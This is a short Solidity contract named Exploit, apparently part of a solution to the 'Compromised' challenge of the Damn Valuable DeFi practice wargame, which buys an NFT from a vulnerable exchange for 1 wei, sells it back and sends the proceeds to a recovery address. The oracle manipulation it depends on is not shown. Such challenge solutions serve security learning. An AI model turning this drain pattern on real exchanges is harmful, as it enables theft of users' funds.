// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {TrustfulOracle} from "src/compromised/TrustfulOracle.sol";
import {Exchange} from "src/compromised/Exchange.sol";
import {DamnValuableNFT} from "src/DamnValuableNFT.sol";

contract Exploit is IERC721Receiver {
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    uint256 nftId;
    address recovery;

    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }

    function buy() external payable {
        // Buy an NFT
        uint256 _nftId = exchange.buyOne{value: 1}();
        nftId = _nftId;
    }

    function sell() external {
        // Sell the NFT
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }

    function recover(uint256 amount) external {
        // Recover the funds
        payable(recovery).transfer(amount);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        pure
        returns (bytes4)
    {
        return this.onERC721Received.selector;
    }

    receive() external payable {
        // Handle incoming ether
    }
}
